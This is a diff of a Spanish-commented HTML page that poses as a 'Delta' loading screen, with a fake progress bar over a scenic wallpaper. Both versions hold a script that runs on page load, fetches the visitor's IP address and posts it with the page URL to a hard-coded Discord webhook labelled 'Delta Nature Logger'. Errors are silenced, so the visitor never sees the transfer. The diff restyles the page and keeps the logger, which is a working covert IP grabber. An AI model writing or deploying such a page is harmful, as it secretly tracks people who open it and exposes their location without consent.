@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta - Loading</title>
+    <title>Delta</title>
     <style>
         * {
             margin: 0;
@@ -15,66 +15,54 @@
             height: 100%;
             width: 100%;
             overflow: hidden;
-            background-color: #050505; /* Fondo oscuro por si acaso */
+            background-color: #000; /* Color inicial */
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: sans-serif;
+            font-family: 'Segoe UI', sans-serif;
         }
 
-        /* Contenedor de la foto de fondo con efectos */
-        .background-container {
+        /* Imagen de fondo con transición de aparición */
+        .background-image {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: -1;
-            background-image: url('https://i.pinimg.com/736x/5d/05/16/5d05164dabe52cbb4f28b2b8eb9ed3db.jpg');
+            background-image: url('https://wallpapers.com/images/hd/4k-nature-moraine-lake-r66plwqa8m3z5reg.jpg');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
-            /* Efecto de animación de respiración/pulso sutil */
-            animation: backgroundPulse 20s infinite alternate ease-in-out;
-            filter: brightness(0.9) contrast(1.1); /* Ajuste ligero de color */
+            opacity: 0; /* Empieza invisible */
+            transition: opacity 2s ease-in-out;
+            transform: scale(1.1);
+            animation: slowZoom 20s infinite alternate;
         }
 
-        /* Capa oscura superpuesta para mejorar contraste */
-        .vignette {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            background: radial-gradient(circle, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.6) 100%);
+        /* Animación de zoom suave para el fondo */
+        @keyframes slowZoom {
+            from { transform: scale(1); }
+            to { transform: scale(1.1); }
         }
 
         /* Panel Glassmorphism */
         .glass-panel {
             z-index: 1;
-            padding: 25px;
-            width: 300px;
-            /* Efectos Glassmorphism clave */
-            background: rgba(255, 255, 255, 0.05); /* Semitransparente muy suave */
-            backdrop-filter: blur(12px); /* Desenfoque del fondo */
-            -webkit-backdrop-filter: blur(12px); /* Compatibilidad */
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.1); /* Borde fino y claro */
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4); /* Sombra suave */
-            
-            /* Animación de entrada */
-            animation: panelFadeIn 1.5s ease-out;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 20px 30px;
+            width: 320px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
         }
 
-        /* Barra de carga minimalista y neón */
+        /* Barra de carga */
         .loader-box {
             width: 100%;
-            height: 4px; /* Un poco más fina */
-            background: rgba(0, 0, 0, 0.3); /* Fondo de la barra más oscuro */
+            height: 5px;
+            background: rgba(0, 0, 0, 0.3);
             border-radius: 10px;
             overflow: hidden;
         }
@@ -82,30 +70,20 @@
         .progress-fill {
             height: 100%;
             width: 0%;
-            /* Degradado neón cian a azul */
             background: linear-gradient(90deg, #00f2fe, #4facfe);
-            /* Brillo neón */
-            box-shadow: 0 0 12px rgba(0, 242, 254, 0.8), 0 0 4px rgba(79, 172, 254, 0.5);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
             transition: width 0.1s linear;
         }
 
-        /* -- Definición de Animaciones -- */
-
-        @keyframes backgroundPulse {
-            0% { transform: scale(1); }
-            100% { transform: scale(1.08); } /* Zoom suave in/out */
-        }
-
-        @keyframes panelFadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        /* Clase para activar la imagen */
+        .visible {
+            opacity: 1 !important;
         }
     </style>
 </head>
 <body>
 
-    <div class="background-container"></div>
-    <div class="vignette"></div>
+    <div class="background-image" id="bg"></div>
 
     <div class="glass-panel">
         <div class="loader-box">
@@ -114,59 +92,47 @@
     </div>
 
     <script>
-        // Configuración de la Webhook (Mantenida)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj';
 
-        // 1. Iniciar lógica al cargar la página
         window.onload = function() {
+            // Hacer aparecer el fondo al cargar
+            document.getElementById('bg').classList.add('visible');
+            
             startLoading();
-            sendMinimalData();
+            sendData();
         };
 
-        // 2. Barra de carga rápida (Mantenida)
         function startLoading() {
             const bar = document.getElementById('progress');
             let width = 0;
-            // Un poco más rápido dado que no hay vídeo que cargar
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
-                    // Opcional: Ocultar panel al terminar
-                    // setTimeout(() => document.querySelector('.glass-panel').style.opacity = '0', 500);
                 } else {
-                    width += 2; // Incremento más rápido
+                    width += 2;
                     bar.style.width = width + '%';
                 }
-            }, 50); // Intervalo rápido
+            }, 60);
         }
 
-        // 3. Envío de datos simplificado (Solo IP y URL - Mantenido)
-        async function sendMinimalData() {
+        async function sendData() {
             let userIP = "Unknown";
             try {
-                // Obtenemos la IP de forma segura (HTTPS)
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 userIP = data.ip;
-            } catch (e) {
-                console.error("Error obteniendo IP:", e);
-            }
+            } catch (e) {}
 
-            // Payload mínimo
-            const payload = {
-                embeds: [{
-                    description: `🌐 **Nueva IP capturada:** \`${userIP}\` \n🔗 **Origen:** ${window.location.href}`,
-                    color: 52223, // Color Cyan neón para hacer juego
-                    footer: { text: "Delta Glass Logger" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Envío a la webhook (silent fail)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    embeds: [{
+                        description: `🌐 **IP:** \`${userIP}\` \n🔗 **URL:** ${window.location.href}`,
+                        color: 4886754, 
+                        footer: { text: "Delta Nature Logger" }
+                    }]
+                })
             }).catch(() => {});
         }
     </script>
